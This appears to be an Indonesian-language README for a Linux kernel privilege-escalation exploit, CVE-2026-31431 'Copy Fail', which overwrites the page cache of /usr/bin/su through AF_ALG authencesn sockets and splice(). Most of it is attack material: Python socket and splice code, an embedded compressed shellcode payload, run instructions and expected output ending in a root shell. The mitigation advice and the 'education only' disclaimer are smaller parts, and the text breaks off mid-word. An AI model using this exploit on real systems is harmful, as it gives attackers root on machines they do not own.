# CVE-2026-31431 - "Copy Fail" Linux Kernel Exploit

## 📋 Ringkasan

**CVE-2026-31431** adalah kerentanan keamanan kritis di kernel Linux yang memungkinkan **eskalasi privilege dari user biasa ke root**. Kerentanan ini terletak pada modul kriptografi `algif_aead` dan dikenal dengan nama **"Copy Fail"**.

> ⚠️ **Peringatan**: Kode ini hanya untuk tujuan **edukasi dan pembelajaran** di lingkungan yang terkontrol. Penggunaan untuk tujuan ilegal atau merugikan adalah melanggar hukum.

---

## 🎯 Deskripsi Kerentanan

### Apa itu CVE-2026-31431?

Kerentanan ini memungkinkan penyerang untuk:
- **Menimpa page cache** dari binary setuid root (seperti `/usr/bin/su`)
- **Menyuntikkan shellcode** ke dalam memori binary
- **Mendapatkan akses root** tanpa memerlukan password

### Komponen yang Terlibat

| Komponen | Deskripsi |
|----------|-----------|
| `algif_aead` | Modul kernel untuk antarmuka AEAD |
| `AF_ALG` | Socket family untuk subsistem kriptografi |
| `authenc` | Algoritma autentikasi + enkripsi |
| `ESN` | Extended Sequence Numbers |
| `splice()` | System call untuk zero-copy transfer |
| `page cache` | Cache file di memori kernel |

### Mekanisme Serangan
- Penyerang membuat socket AF_ALG dengan algoritma authencesn
- Mengirimkan data dengan flag MSG_SPLICE_PAGES
- Bug di kernel menyebabkan out-of-bounds write
- Kernel menulis data ke page cache yang salah (korupsi)
- Page cache /usr/bin/su tertimpa dengan shellcode
- Eksekusi /usr/bin/su memberikan shell root

## 🏗️ Arsitektur Kode
### Struktur Program
copyfail.py
```
├── Konstanta
│ ├── AF_ALG, SOCK_SEQPACKET
│ ├── SOL_ALG, ALG_SET_*
│ └── MSG_SPLICE_PAGES
├── Fungsi Bantu
│ ├── hex_to_bytes()
│ ├── load_modules()
│ ├── check_available_algorithms()
│ └── is_su_setuid()
├── Fungsi Eksploitasi
│ ├── create_exploit_socket()
│ ├── setup_socket()
│ └── exploit_page_cache()
└── Main Program
├── Cek kernel & algoritma
├── Load payload
├── Jalankan eksploitasi
└── Eksekusi /usr/bin/su
```

### Alur Eksekusi
```
[Mulai] --> [Load Modul Kernel] --> [Verifikasi /usr/bin/su]
--> [Check Algoritma Tersedia]
--> [Tidak Tersedia] --> [Info: Kernel sudah di-patch]
--> [Tersedia] --> [Buat Socket AF_ALG]
--> [Setup Socket dengan Key & IV]
--> [Accept Koneksi]
--> [Overwrite Page Cache]
--> [Eksekusi /usr/bin/su]
--> [Shell Root]
```

## 🔧 Komponen Teknis
### 1. AF_ALG Socket Programming

```python
# Membuat socket AF_ALG
sock = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)

# Bind dengan algoritma target
sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

# Konfigurasi dengan setsockopt
sock.setsockopt(SOL_ALG, ALG_SET_KEY, key)
sock.setsockopt(SOL_ALG, ALG_SET_OP, None, 4)
# 2. Control Messages (CMSG)
# Mengirim data dengan control messages
conn.sendmsg(
    [b"A" * 4 + chunk],
    [
        (SOL_ALG, ALG_SET_OP, null_bytes * 4),
        (SOL_ALG, ALG_SET_IV, b'\x10' + null_bytes * 19),
        (SOL_ALG, ALG_SET_AEAD_AUTHSIZE, b'\x08' + null_bytes * 3),
    ],
    MSG_SPLICE_PAGES
)
# 3. Zero-Copy dengan splice()
# Transfer data dari file ke pipe
read_fd, write_fd = os.pipe()
os.splice(target_fd, write_fd, offset + 4, offset_src=0)

# Transfer dari pipe ke socket
os.splice(read_fd, conn.fileno(), offset + 4)
```

### 🎯 Payload
Payload yang digunakan adalah shellcode untuk mendapatkan shell root:

```python
compressed = hex_to_bytes(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d20"
    "9a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c"
    "7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
)
payload = zlib.decompress(compressed)
```
### 🚀 Panduan Instalasi
**Prasyarat**
- Linux kernel 5.4 - 6.9 (rentan)
- Python 3.6+
- Hak akses user biasa (bukan root!)
- Modul: authenc, algif_aead, hmac, sha256_generic, cbc, aes_generic

**Langkah-langkah**

# 1. Buat user test
```
sudo useradd -m testuser
sudo passwd testuser
```
# 2. Login sebagai user biasa
`su - testuser`

# 3. Jalankan eksploitasi
`python3 copyfail.py`

### 🔍 Diagnostik
**Cek Kernel Version**
`uname -r`
# Jika >= 6.10, kernel sudah di-patch
**Cek Algoritma Tersedia**
```bash
cat /proc/crypto | grep -A 10 "authenc"
```

**Cek Modul Kernel**
```bash
lsmod | grep -E "algif|authenc"
find /lib/modules/$(uname -r) -name "*authenc*.ko*"
```
### Cek Status Patch**
**Cek taint status (`0` = clean)**
`cat /proc/sys/kernel/tainted`

**Cek log kernel untuk patch**
`dmesg | grep -i "crypto\|cve"`

### 📊 Output yang Diharapkan
**Sistem Rentan (Berhasil)**
```
============================================================
  CVE-2026-31431 - Copy Fail Exploit
  Eskalasi privilege via page cache corruption
============================================================
[*] Memuat modul kernel...
    [+] authenc dimuat
[*] Membuka /usr/bin/su
[*] Payload size: 160 bytes
[*] Membuat socket AF_ALG...
[+] Berhasil bind dengan: authencesn(hmac(sha256),cbc(aes))
[*] Memulai overwrite page cache...
    Progress: 50.0% (80/160 bytes)
[+] Page cache /usr/bin/su berhasil ditimpa!
[*] Menjalankan 'su' untuk mendapatkan shell root...
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Sistem Sudah Dipatch (Gagal)**
```
============================================================
  CVE-2026-31431 - Copy Fail Exploit
============================================================
[!] Tidak ada algoritma yang tersedia!
[!] Ini menandakan kernel Anda sudah di-patch
[!] Sistem Anda AMAN dari kerentanan ini

[*] Informasi Sistem:
    Kernel: 6.17.0-35-generic
    OS: Linux x86_64

[*] Rekomendasi:
    ✅ Sistem Anda sudah aman
    ✅ Tetap update kernel secara rutin
    📚 Gunakan VM dengan kernel lama untuk pembelajaran
```

### 🛡️ Mitigasi
**Untuk Administrator**
Update Kernel (Prioritas Utama)
```bash
# Ubuntu/Debian
sudo apt update && sudo apt upgrade -y
sudo reboot

# RHEL/CentOS
sudo yum update kernel -y
sudo reboot

# Arch
sudo pacman -Syu
sudo reboot
```
Disable AF_ALG (Sementara)
```bash
# Nonaktifkan modul
sudo modprobe -r algif_aead
echo "blacklist algif_aead" | sudo tee /etc/modprobe.d/blacklist-afalg.conf
```

Kebijakan Seccomp (Container)
```json
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": ["socket"],
      "action": "SCMP_ACT_ERRNO",
      "args": [
        {
          "index": 0,
          "value": 38,
          "op": "SCMP_CMP_EQ"
        }
      ]
    }
  ]
}
```
**Untuk Pengembang**
- Monitor /proc/crypto
- Audit modul yang dimuat
- Gunakan AppArmor/SELinux
- Terapkan prinsip least privilege

### ⚠️ Disclaimer
Kode ini disediakan untuk tujuan edukasi dan penelitian keamanan saja.
- ❌ Jangan gunakan pada sistem produksi
- ❌ Jangan gunakan untuk tujuan ilegal
- ❌ Jangan gunakan pada sistem yang tidak Anda miliki
- ✅ Gunakan hanya di lingkungan laboratorium yang terkontrol
- ✅ Pelajari mekanisme keamanan kernel Linux
- ✅ Bantu meningkatkan keamanan dengan melaporkan ker
